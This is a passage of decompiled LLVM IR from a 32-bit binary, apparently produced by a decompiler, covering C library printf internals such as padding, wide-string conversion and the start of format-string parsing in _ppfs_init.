  store i32 %v3_80520f2, i32* %eax.global-to-local, align 4
  %v1_80520f6 = add i32 %v0_80520f2, 8
  %v2_80520f6 = inttoptr i32 %v1_80520f6 to i32*
  store i32 0, i32* %v2_80520f6, align 4
  %v0_80520fe = load i32, i32* %eax.global-to-local, align 4
  %v1_80520fe = load i32, i32* @edx, align 4
  %v2_80520fe = sub i32 %v0_80520fe, %v1_80520fe
  %v7_80520fe = icmp ult i32 %v0_80520fe, %v1_80520fe
  %v12_80520fe = icmp eq i32 %v2_80520fe, 0
  %v2_8052100 = or i1 %v7_80520fe, %v12_80520fe
  br i1 %v2_8052100, label %dec_label_pc_8052108, label %dec_label_pc_8052102

dec_label_pc_8052102:                             ; preds = %dec_label_pc_80520f2
  store i32 %v2_80520fe, i32* %eax.global-to-local, align 4
  %v1_8052104 = load i32, i32* @esp, align 4
  %v2_8052104 = add i32 %v1_8052104, 8
  %v3_8052104 = inttoptr i32 %v2_8052104 to i32*
  store i32 %v2_80520fe, i32* %v3_8052104, align 4
  %v0_805210c.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052108

dec_label_pc_8052108:                             ; preds = %dec_label_pc_80520f2, %dec_label_pc_8052102
  %v0_805210c = phi i32 [ %v1_80520fe, %dec_label_pc_80520f2 ], [ %v0_805210c.pre, %dec_label_pc_8052102 ]
  %v0_8052108 = load i32, i32* @esp, align 4
  %v1_8052108 = add i32 %v0_8052108, 8
  %v2_8052108 = inttoptr i32 %v1_8052108 to i32*
  %v3_8052108 = load i32, i32* %v2_8052108, align 4
  store i32 %v3_8052108, i32* @ecx, align 4
  %v2_805210c = add i32 %v3_8052108, %v0_805210c
  store i32 %v2_805210c, i32* %eax.global-to-local, align 4
  %v1_805210f = inttoptr i32 %v0_8052108 to i32*
  %v2_805210f = load i32, i32* %v1_805210f, align 4
  %v4_805210f = add i32 %v2_805210f, %v2_805210c
  store i32 %v4_805210f, i32* %v1_805210f, align 4
  %v0_8052112 = load i32, i32* @esp, align 4
  %v1_8052112 = add i32 %v0_8052112, 7
  %v2_8052112 = inttoptr i32 %v1_8052112 to i8*
  %v3_8052112 = load i8, i8* %v2_8052112, align 1
  %v9_8052112 = icmp eq i8 %v3_8052112, 48
  %v1_8052117 = icmp eq i1 %v9_8052112, false
  br i1 %v1_8052117, label %dec_label_pc_8052123, label %dec_label_pc_8052119

dec_label_pc_8052119:                             ; preds = %dec_label_pc_8052108
  %v0_8052119 = load i32, i32* @ebx, align 4
  %v1_8052119 = load i32, i32* @ecx, align 4
  %v2_8052119 = add i32 %v1_8052119, %v0_8052119
  store i32 %v2_8052119, i32* @ebx, align 4
  %v1_805211b = add i32 %v0_8052112, 8
  %v2_805211b = inttoptr i32 %v1_805211b to i32*
  store i32 0, i32* %v2_805211b, align 4
  %v0_8052123.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052123

dec_label_pc_8052123:                             ; preds = %dec_label_pc_8052108, %dec_label_pc_8052119
  %v0_805212a = phi i32 [ %v0_8052112, %dec_label_pc_8052108 ], [ %v0_8052123.pre, %dec_label_pc_8052119 ]
  %v1_8052123 = add i32 %v0_805212a, 32
  %v2_8052123 = inttoptr i32 %v1_8052123 to i8*
  %v3_8052123 = load i8, i8* %v2_8052123, align 1
  %v4_8052123 = and i8 %v3_8052123, 8
  %v5_8052123 = icmp eq i8 %v4_8052123, 0
  %v1_8052128 = icmp eq i1 %v5_8052123, false
  br i1 %v1_8052128, label %dec_label_pc_8052151, label %dec_label_pc_805212a

dec_label_pc_805212a:                             ; preds = %dec_label_pc_8052123
  %v1_805212a = add i32 %v0_805212a, 8
  %v2_805212a = inttoptr i32 %v1_805212a to i32*
  %v3_805212a = load i32, i32* %v2_805212a, align 4
  store i32 %v3_805212a, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8052133 = add i32 %v0_805212a, 368
  %v2_8052133 = inttoptr i32 %v1_8052133 to i32*
  %v3_8052133 = load i32, i32* %v2_8052133, align 4
  store i32 %v3_8052133, i32* @eax, align 4
  %v0_805213a = call i32 @_charpad()
  store i32 %v0_805213a, i32* %eax.global-to-local, align 4
  %v1_805213f = load i32, i32* @esp, align 4
  %v2_805213f = add i32 %v1_805213f, 8
  %v3_805213f = inttoptr i32 %v2_805213f to i32*
  %v4_805213f = load i32, i32* %v3_805213f, align 4
  %v15_805213f = icmp eq i32 %v0_805213a, %v4_805213f
  %v1_8052143 = icmp eq i1 %v15_805213f, false
  br i1 %v1_8052143, label %dec_label_pc_805223f, label %dec_label_pc_8052149

dec_label_pc_8052149:                             ; preds = %dec_label_pc_805212a
  store i32 0, i32* %v3_805213f, align 4
  %v1_8052151.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052151

dec_label_pc_8052151:                             ; preds = %dec_label_pc_8052123, %dec_label_pc_8052149
  %v1_8052151 = phi i32 [ %v0_805212a, %dec_label_pc_8052123 ], [ %v1_8052151.pre, %dec_label_pc_8052149 ]
  %v0_8052151 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052151 = add i32 %v1_8052151, -4
  %v3_8052151 = inttoptr i32 %v2_8052151 to i32*
  store i32 %v0_8052151, i32* %v3_8052151, align 4
  %v0_8052152 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052152 = add i32 %v1_8052151, -8
  %v3_8052152 = inttoptr i32 %v2_8052152 to i32*
  store i32 %v0_8052152, i32* %v3_8052152, align 4
  %v1_8052153 = add i32 %v1_8052151, 368
  %v2_8052153 = inttoptr i32 %v1_8052153 to i32*
  %v3_8052153 = load i32, i32* %v2_8052153, align 4
  %v5_8052153 = add i32 %v1_8052151, -12
  %v6_8052153 = inttoptr i32 %v5_8052153 to i32*
  store i32 %v3_8052153, i32* %v6_8052153, align 4
  %v0_805215a = load i32, i32* @ebp, align 4
  %v1_805215a = add i32 %v0_805215a, ptrtoint (i32* @global_var_805d005.927 to i32)
  store i32 %v1_805215a, i32* %eax.global-to-local, align 4
  %v2_8052160 = add i32 %v1_8052151, -16
  %v3_8052160 = inttoptr i32 %v2_8052160 to i32*
  store i32 %v1_805215a, i32* %v3_8052160, align 4
  %v0_8052161 = call i32 @__GI_fputs_unlocked()
  store i32 %v0_8052161, i32* %eax.global-to-local, align 4
  %v0_8052166 = load i32, i32* @esp, align 4
  %v1_8052166 = add i32 %v0_8052166, 384
  %v2_8052166 = inttoptr i32 %v1_8052166 to i32*
  %v3_8052166 = load i32, i32* %v2_8052166, align 4
  store i32 %v3_8052166, i32* @eax, align 4
  %v0_805216d = load i32, i32* @ebx, align 4
  store i32 %v0_805216d, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_8052174 = call i32 @_charpad()
  store i32 %v0_8052174, i32* %eax.global-to-local, align 4
  %v0_8052179 = load i32, i32* @esp, align 4
  %v1_8052179 = add i32 %v0_8052179, 16
  %v1_805217c = load i32, i32* @ebx, align 4
  %v12_805217c = icmp eq i32 %v0_8052174, %v1_805217c
  %v1_805217e = icmp eq i1 %v12_805217c, false
  br i1 %v1_805217e, label %dec_label_pc_805223f, label %dec_label_pc_8052184

dec_label_pc_8052184:                             ; preds = %dec_label_pc_8052151
  %v1_8052184 = add i32 %v0_8052179, 356
  %v2_8052184 = inttoptr i32 %v1_8052184 to i32*
  %v3_8052184 = load i32, i32* %v2_8052184, align 4
  %v4_8052184 = icmp eq i32 %v3_8052184, 0
  %v1_805218c = icmp eq i1 %v4_8052184, false
  br i1 %v1_805218c, label %dec_label_pc_80521b0, label %dec_label_pc_805218e

dec_label_pc_805218e:                             ; preds = %dec_label_pc_8052184
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8052190 = load i32, i32* @esi, align 4
  %v1_8052190 = icmp eq i32 %v0_8052190, 0
  br i1 %v1_8052190, label %dec_label_pc_80521a6.thread, label %dec_label_pc_80521a6

dec_label_pc_80521a6.thread:                      ; preds = %dec_label_pc_805218e
  br label %dec_label_pc_8052211

dec_label_pc_80521a6:                             ; preds = %dec_label_pc_805218e
  %v2_8052194 = add i32 %v0_8052179, 12
  %v3_8052194 = inttoptr i32 %v2_8052194 to i32*
  store i32 0, i32* %v3_8052194, align 4
  %v1_8052195 = add i32 %v0_8052179, 384
  %v2_8052195 = inttoptr i32 %v1_8052195 to i32*
  %v3_8052195 = load i32, i32* %v2_8052195, align 4
  %v5_8052195 = add i32 %v0_8052179, 8
  %v6_8052195 = inttoptr i32 %v5_8052195 to i32*
  store i32 %v3_8052195, i32* %v6_8052195, align 4
  %v0_805219c = load i32, i32* @esi, align 4
  %v2_805219c = add i32 %v0_8052179, 4
  %v3_805219c = inttoptr i32 %v2_805219c to i32*
  store i32 %v0_805219c, i32* %v3_805219c, align 4
  %v0_805219d = load i32, i32* @edi, align 4
  %v3_805219d = inttoptr i32 %v0_8052179 to i32*
  store i32 %v0_805219d, i32* %v3_805219d, align 4
  %v0_805219e = load i32, i32* %stack_var_-364, align 4
  %v4_805219e = call i32 @__stdio_fwrite(i32 %v0_805219e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805219e, i32* %eax.global-to-local, align 4
  %v0_80521a3 = load i32, i32* @esp, align 4
  %v1_80521a3 = add i32 %v0_80521a3, 16
  %v1_80521a6.pre = load i32, i32* @esi, align 4
  %v12_80521a6 = icmp eq i32 %v4_805219e, %v1_80521a6.pre
  %v1_80521a8 = icmp eq i1 %v12_80521a6, false
  br i1 %v1_80521a8, label %dec_label_pc_805223f, label %dec_label_pc_8052211

dec_label_pc_80521b0:                             ; preds = %dec_label_pc_8052184
  %v1_80521b0 = add i32 %v0_8052179, 348
  %v2_80521b0 = inttoptr i32 %v1_80521b0 to i32*
  store i32 0, i32* %v2_80521b0, align 4
  %v0_805220d7 = load i32, i32* @esi, align 4
  %v1_805220d8 = icmp eq i32 %v0_805220d7, 0
  %v1_805220f15 = icmp eq i1 %v1_805220d8, false
  br i1 %v1_805220f15, label %dec_label_pc_80521bd, label %dec_label_pc_80521b0.dec_label_pc_8052211.loopexit_crit_edge

dec_label_pc_80521b0.dec_label_pc_8052211.loopexit_crit_edge: ; preds = %dec_label_pc_80521b0
  %v0_8052211.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052211

dec_label_pc_80521bd:                             ; preds = %dec_label_pc_80521b0, %dec_label_pc_805220b
  %v0_80521bd = phi i32 [ %v2_805220b, %dec_label_pc_805220b ], [ %v0_805220d7, %dec_label_pc_80521b0 ]
  %tmp102 = icmp ult i32 %v0_80521bd, 129
  br i1 %tmp102, label %dec_label_pc_80521cc, label %dec_label_pc_80521c7

dec_label_pc_80521c7:                             ; preds = %dec_label_pc_80521bd
  br label %dec_label_pc_80521cc

dec_label_pc_80521cc:                             ; preds = %dec_label_pc_80521bd, %dec_label_pc_80521c7
  %storemerge103 = phi i32 [ 128, %dec_label_pc_80521c7 ], [ %v0_80521bd, %dec_label_pc_80521bd ]
  store i32 %storemerge103, i32* %edx.global-to-local, align 4
  %v0_80521cc = load i32, i32* @esp, align 4
  %v1_80521cc = add i32 %v0_80521cc, 332
  %v2_80521d3 = add i32 %v0_80521cc, -4
  %v3_80521d3 = inttoptr i32 %v2_80521d3 to i32*
  store i32 %v1_80521cc, i32* %v3_80521d3, align 4
  %v0_80521d4 = load i32, i32* %edx.global-to-local, align 4
  %v2_80521d4 = add i32 %v0_80521cc, -8
  %v3_80521d4 = inttoptr i32 %v2_80521d4 to i32*
  store i32 %v0_80521d4, i32* %v3_80521d4, align 4
  %v1_80521d5 = add i32 %v0_80521cc, 340
  store i32 %v1_80521d5, i32* %eax.global-to-local, align 4
  %v2_80521dc = add i32 %v0_80521cc, -12
  %v3_80521dc = inttoptr i32 %v2_80521dc to i32*
  store i32 %v1_80521d5, i32* %v3_80521dc, align 4
  %v1_80521dd = add i32 %v0_80521cc, 204
  store i32 %v1_80521dd, i32* @edi, align 4
  %v2_80521e4 = add i32 %v0_80521cc, -16
  %v3_80521e4 = inttoptr i32 %v2_80521e4 to i32*
  store i32 %v1_80521dd, i32* %v3_80521e4, align 4
  %v0_80521e5 = call i32 @__GI_wcsrtombs()
  store i32 %v0_80521e5, i32* @ebx, align 4
  %v0_80521ec = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80521f1 = icmp eq i32 %v0_80521e5, 0
  br i1 %v1_80521f1, label %dec_label_pc_8052207, label %dec_label_pc_80521f5

dec_label_pc_80521f5:                             ; preds = %dec_label_pc_80521cc
  %v0_80521f5 = load i32, i32* @ebp, align 4
  %v2_80521f5 = add i32 %v0_80521ec, 12
  %v3_80521f5 = inttoptr i32 %v2_80521f5 to i32*
  store i32 %v0_80521f5, i32* %v3_80521f5, align 4
  %v1_80521f6 = add i32 %v0_80521ec, 384
  %v2_80521f6 = inttoptr i32 %v1_80521f6 to i32*
  %v3_80521f6 = load i32, i32* %v2_80521f6, align 4
  %v5_80521f6 = add i32 %v0_80521ec, 8
  %v6_80521f6 = inttoptr i32 %v5_80521f6 to i32*
  store i32 %v3_80521f6, i32* %v6_80521f6, align 4
  %v2_80521fd = add i32 %v0_80521ec, 4
  %v3_80521fd = inttoptr i32 %v2_80521fd to i32*
  store i32 %v0_80521e5, i32* %v3_80521fd, align 4
  %v0_80521fe = load i32, i32* @edi, align 4
  %v3_80521fe = inttoptr i32 %v0_80521ec to i32*
  store i32 %v0_80521fe, i32* %v3_80521fe, align 4
  %v0_80521ff = load i32, i32* %stack_var_-364, align 4
  %v4_80521ff = call i32 @__stdio_fwrite(i32 %v0_80521ff, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80521ff, i32* %eax.global-to-local, align 4
  %v0_8052204 = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052207

dec_label_pc_8052207:                             ; preds = %dec_label_pc_80521cc, %dec_label_pc_80521f5
  %v0_805223f49.in = phi i32 [ %v0_80521ec, %dec_label_pc_80521cc ], [ %v0_8052204, %dec_label_pc_80521f5 ]
  %v1_805220b = phi i32 [ 0, %dec_label_pc_80521cc ], [ %v4_80521ff, %dec_label_pc_80521f5 ]
  %v0_805223f49 = add i32 %v0_805223f49.in, 16
  %v12_8052207 = icmp eq i32 %v1_805220b, %v0_80521e5
  %v1_8052209 = icmp eq i1 %v12_8052207, false
  br i1 %v1_8052209, label %dec_label_pc_805223f, label %dec_label_pc_805220b

dec_label_pc_805220b:                             ; preds = %dec_label_pc_8052207
  %v0_805220b = load i32, i32* @esi, align 4
  %v2_805220b = sub i32 %v0_805220b, %v1_805220b
  %v12_805220b = icmp eq i32 %v2_805220b, 0
  store i32 %v2_805220b, i32* @esi, align 4
  %v1_805220f = icmp eq i1 %v12_805220b, false
  br i1 %v1_805220f, label %dec_label_pc_80521bd, label %dec_label_pc_8052211

dec_label_pc_8052211:                             ; preds = %dec_label_pc_805220b, %dec_label_pc_80521a6.thread, %dec_label_pc_80521b0.dec_label_pc_8052211.loopexit_crit_edge, %dec_label_pc_80521a6
  %v0_8052211 = phi i32 [ %v1_80521a3, %dec_label_pc_80521a6 ], [ %v0_8052211.pre.pre, %dec_label_pc_80521b0.dec_label_pc_8052211.loopexit_crit_edge ], [ %v1_8052179, %dec_label_pc_80521a6.thread ], [ %v0_805223f49, %dec_label_pc_805220b ]
  %v1_8052211 = add i32 %v0_8052211, 8
  %v2_8052211 = inttoptr i32 %v1_8052211 to i32*
  %v3_8052211 = load i32, i32* %v2_8052211, align 4
  store i32 %v3_8052211, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_805221a = add i32 %v0_8052211, 368
  %v2_805221a = inttoptr i32 %v1_805221a to i32*
  %v3_805221a = load i32, i32* %v2_805221a, align 4
  store i32 %v3_805221a, i32* @eax, align 4
  %v0_8052221 = call i32 @_charpad()
  store i32 %v0_8052221, i32* %eax.global-to-local, align 4
  %v1_8052226 = load i32, i32* @esp, align 4
  %v2_8052226 = add i32 %v1_8052226, 8
  %v3_8052226 = inttoptr i32 %v2_8052226 to i32*
  %v4_8052226 = load i32, i32* %v3_8052226, align 4
  %v15_8052226 = icmp eq i32 %v0_8052221, %v4_8052226
  %v1_805222a = icmp eq i1 %v15_8052226, false
  br i1 %v1_805222a, label %dec_label_pc_805223f, label %dec_label_pc_805222c

dec_label_pc_805222c:                             ; preds = %dec_label_pc_8052211, %dec_label_pc_8051fa6, %dec_label_pc_8051dd4
  %v0_805222c = phi i32 [ %v1_8052226, %dec_label_pc_8052211 ], [ %v0_805222c.pre, %dec_label_pc_8051fa6 ], [ %v1_8051df2, %dec_label_pc_8051dd4 ]
  %v1_805222c = add i32 %v0_805222c, 16
  %v2_805222c = inttoptr i32 %v1_805222c to i32*
  %v3_805222c = load i32, i32* %v2_805222c, align 4
  store i32 %v3_805222c, i32* @ebx, align 4
  store i32 %v3_805222c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051d2c.backedge

dec_label_pc_8052237:                             ; preds = %dec_label_pc_8051d6a
  %v1_8052237 = add i32 %v0_8052237, 2
  store i32 %v1_8052237, i32* @ebx, align 4
  br label %dec_label_pc_8051d2c.backedge

dec_label_pc_805223f:                             ; preds = %dec_label_pc_8051d56, %dec_label_pc_8052211, %dec_label_pc_80521a6, %dec_label_pc_8052151, %dec_label_pc_805212a, %dec_label_pc_805209a, %dec_label_pc_8052015, %dec_label_pc_8051fe9, %dec_label_pc_8051f7d, %dec_label_pc_8052207
  %v0_805223f = phi i32 [ %v0_805223f49, %dec_label_pc_8052207 ], [ %v0_805223f.pre.pre, %dec_label_pc_8051d56 ], [ %v1_8052226, %dec_label_pc_8052211 ], [ %v1_80521a3, %dec_label_pc_80521a6 ], [ %v1_8052179, %dec_label_pc_8052151 ], [ %v1_805213f, %dec_label_pc_805212a ], [ %v0_8051dcc.lcssa, %dec_label_pc_805209a ], [ %v1_805202d, %dec_label_pc_8052015 ], [ %v1_8052000, %dec_label_pc_8051fe9 ], [ %v1_8051f9b, %dec_label_pc_8051f7d ]
  %v1_805223f = inttoptr i32 %v0_805223f to i32*
  store i32 -1, i32* %v1_805223f, align 4
  br label %dec_label_pc_8052246

dec_label_pc_8052246:                             ; preds = %dec_label_pc_8051d61, %dec_label_pc_8051ccf, %dec_label_pc_8051cee, %dec_label_pc_805223f
  %v0_8052246 = load i32, i32* @esp, align 4
  %v1_8052246 = inttoptr i32 %v0_8052246 to i32*
  %v2_8052246 = load i32, i32* %v1_8052246, align 4
  store i32 %v2_8052246, i32* %eax.global-to-local, align 4
  %v1_8052249 = add i32 %v0_8052246, 348
  %v1_805224f = inttoptr i32 %v1_8052249 to i32*
  %v2_805224f = load i32, i32* %v1_805224f, align 4
  store i32 %v2_805224f, i32* @ebx, align 4
  ret i32 %v2_8052246

; uselistorder directives
  uselistorder i32 %v1_8052237, { 1, 0 }
  uselistorder i32 %v3_805222c, { 2, 3, 0, 1 }
  uselistorder i32 %v0_8052211, { 1, 0 }
  uselistorder i32 %v2_805220b, { 1, 2, 0 }
  uselistorder i32 %v0_805223f49, { 1, 0 }
  uselistorder i32 %v1_805220b, { 1, 0 }
  uselistorder i32 %v0_80521ec, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v0_8052179, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_8052151, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_805212a, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80520fe, { 1, 0, 2 }
  uselistorder i32 %v6_80520eb, { 1, 0 }
  uselistorder i32 %v1_80520e8, { 1, 0 }
  uselistorder i32 %v0_80520e1, { 0, 3, 2, 1 }
  uselistorder i32 %v1_805206b, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_805207b, { 2, 3, 1, 0 }
  uselistorder i32 %v0_8051fdc, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v0_8051fc2, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v0_8051f5b, { 1, 0, 2 }
  uselistorder i32 %v1_8051edf, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_8051f32, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_8051ebb, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8051e74, { 1, 0 }
  uselistorder i32 %v1_8051e81, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v3_8051dcc, { 3, 13, 12, 5, 4, 7, 6, 8, 11, 0, 1, 2, 10, 9, 14, 15 }
  uselistorder i32 %v0_8051dcc.lcssa, { 0, 8, 7, 6, 9, 24, 23, 12, 13, 14, 15, 16, 17, 11, 10, 19, 18, 22, 21, 20, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_8051dc8, { 1, 0 }
  uselistorder i32 %v1_8051dc8.pre, { 1, 0 }
  uselistorder i32 %v1_8051dc7, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_8051dc4, { 1, 0 }
  uselistorder i32 %v2_8051dc880, { 1, 0 }
  uselistorder i32 %v3_8051dae, { 1, 0 }
  uselistorder i32 %v1_8051d6a, { 0, 2, 3, 1 }
  uselistorder i32 %v2_8051d36, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8051d3a, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8051d24, { 1, 0, 2 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 6, 5, 2, 3, 1, 0, 4, 7, 8, 9 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 4, 25, 5, 1, 6, 10, 7, 8, 9, 11, 12, 13, 14, 16, 15, 18, 17, 19, 20, 26, 21, 22, 23, 27, 24, 28, 29, 30, 31 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 205, { 1, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 -28, { 0, 2, 1, 3, 4, 5, 9, 8, 7, 6, 10, 11, 12, 13 }
  uselistorder i32 204, { 3, 1, 4, 2, 5, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_8052246, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805223f, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_8052211, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8052207, { 1, 0 }
  uselistorder label %dec_label_pc_80521cc, { 1, 0 }
  uselistorder label %dec_label_pc_80521bd, { 1, 0 }
  uselistorder label %dec_label_pc_8052151, { 1, 0 }
  uselistorder label %dec_label_pc_8052123, { 1, 0 }
  uselistorder label %dec_label_pc_8052108, { 1, 0 }
  uselistorder label %dec_label_pc_80520f2, { 1, 0 }
  uselistorder label %dec_label_pc_80520de, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80520d2, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805206b, { 1, 0 }
  uselistorder label %dec_label_pc_805205e, { 1, 0 }
  uselistorder label %dec_label_pc_8051fe9, { 1, 0 }
  uselistorder label %dec_label_pc_8051f7d, { 1, 0 }
  uselistorder label %dec_label_pc_8051f32, { 1, 0 }
  uselistorder label %dec_label_pc_8051f23, { 6, 2, 1, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_8051ee9, { 1, 0 }
  uselistorder label %dec_label_pc_8051ed0, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8051e81, { 1, 0 }
  uselistorder label %dec_label_pc_8051e68, { 1, 0 }
  uselistorder label %dec_label_pc_8051e54, { 1, 0 }
  uselistorder label %dec_label_pc_8051e4f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051e30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051dbd, { 1, 0 }
  uselistorder label %dec_label_pc_8051db5, { 1, 0 }
  uselistorder label %dec_label_pc_8051d61, { 1, 0 }
  uselistorder label %dec_label_pc_8051d56, { 1, 0 }
  uselistorder label %dec_label_pc_8051d2c.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052254 = load i32, i32* @esi, align 4
  %v0_8052255 = load i32, i32* @ebx, align 4
  store i32 %v0_8052255, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_8052269 = bitcast i32* %arg1 to i8*
  %v4_8052269 = call i32 @__GI_memset(i8* %v3_8052269, i32 0, i32 188)
  store i32 %v4_8052269, i32* %eax.global-to-local, align 4
  %v0_805226e = load i32, i32* @ebx, align 4
  %v1_805226e = add i32 %v0_805226e, 24
  %v2_805226e = inttoptr i32 %v1_805226e to i32*
  %v3_805226e = load i32, i32* %v2_805226e, align 4
  %v4_805226e = add i32 %v3_805226e, -1
  store i32 %v4_805226e, i32* %v2_805226e, align 4
  %v0_8052271 = load i32, i32* @esi, align 4
  %v1_8052271 = load i32, i32* @ebx, align 4
  %v2_8052271 = inttoptr i32 %v1_8052271 to i32*
  store i32 %v0_8052271, i32* %v2_8052271, align 4
  %v0_8052273 = load i32, i32* @ebx, align 4
  %v1_8052273 = add i32 %v0_8052273, 40
  store i32 %v1_8052273, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805227e

dec_label_pc_805227e:                             ; preds = %dec_label_pc_805227e, %entry
  %v0_805227e = phi i32 [ %v1_8052284, %dec_label_pc_805227e ], [ %v1_8052273, %entry ]
  %v1_805227e = inttoptr i32 %v0_805227e to i32*
  store i32 8, i32* %v1_805227e, align 4
  %v0_8052284 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052284 = add i32 %v0_8052284, 4
  store i32 %v1_8052284, i32* %eax.global-to-local, align 4
  %v0_8052287 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052287 = add i32 %v0_8052287, -1
  %v8_8052287 = icmp eq i32 %v1_8052287, 0
  store i32 %v1_8052287, i32* %edx.global-to-local, align 4
  %v1_8052288 = icmp eq i1 %v8_8052287, false
  br i1 %v1_8052288, label %dec_label_pc_805227e, label %dec_label_pc_805228a

dec_label_pc_805228a:                             ; preds = %dec_label_pc_805227e
  %v0_805228a = load i32, i32* @esi, align 4
  store i32 %v0_805228a, i32* %eax.global-to-local, align 4
  %v1_80522b520 = inttoptr i32 %v0_805228a to i8*
  %v2_80522b521 = load i8, i8* %v1_80522b520, align 1
  %v3_80522b522 = zext i8 %v2_80522b521 to i32
  %v5_80522b523 = and i32 %v1_8052287, -256
  %v6_80522b524 = or i32 %v3_80522b522, %v5_80522b523
  store i32 %v6_80522b524, i32* %edx.global-to-local, align 4
  %v4_80522b725 = icmp eq i8 %v2_80522b521, 0
  %v1_80522b926 = icmp eq i1 %v4_80522b725, false
  br i1 %v1_80522b926, label %dec_label_pc_8052293, label %dec_label_pc_80522bb

dec_label_pc_8052293:                             ; preds = %dec_label_pc_805228a, %dec_label_pc_80522b5.backedge
  %v6_80522b529 = phi i32 [ %v6_80522b5, %dec_label_pc_80522b5.backedge ], [ %v6_80522b524, %dec_label_pc_805228a ]
  %v2_80522b528 = phi i8 [ %v2_80522b5, %dec_label_pc_80522b5.backedge ], [ %v2_80522b521, %dec_label_pc_805228a ]
  %v0_805229827 = phi i32 [ %v0_8052298.be, %dec_label_pc_80522b5.backedge ], [ %v0_805228a, %dec_label_pc_805228a ]
  %v10_8052293 = icmp eq i8 %v2_80522b528, 37
  %v1_8052296 = icmp eq i1 %v10_8052293, false
  br i1 %v1_8052296, label %dec_label_pc_80522b4, label %dec_label_pc_8052298

dec_label_pc_8052298:                             ; preds = %dec_label_pc_8052293
  %v1_8052298 = add i32 %v0_805229827, 1
  store i32 %v1_8052298, i32* %eax.global-to-local, align 4
  %v1_8052299 = inttoptr i32 %v1_8052298 to i8*
  %v2_8052299 = load i8, i8* %v1_8052299, align 1
  %v11_8052299 = icmp eq i8 %v2_8052299, 37
  br i1 %v11_8052299, label %dec_label_pc_80522b4, label %dec_label_pc_805229e

dec_label_pc_805229e:                             ; preds = %dec_label_pc_8052298
  %v1_80522a1 = load i32, i32* @ebx, align 4
  %v2_80522a1 = inttoptr i32 %v1_80522a1 to i32*
  store i32 %v1_8052298, i32* %v2_80522a1, align 4
  %v0_80522a3 = load i32, i32* @ebx, align 4
  %v1_80522a4 = inttoptr i32 %v0_80522a3 to i32*
  %v2_80522a4 = call i32 @_ppfs_parsespec(i32* %v1_80522a4)
  store i32 %v2_80522a4, i32* %eax.global-to-local, align 4
  %v2_80522ac = icmp slt i32 %v2_80522a4, 0
  br i1 %v2_80522ac, label %dec_label_pc_80522bf, label %dec_label_pc_80522b0

dec_label_pc_80522b0:                             ; preds = %dec_label_pc_805229e
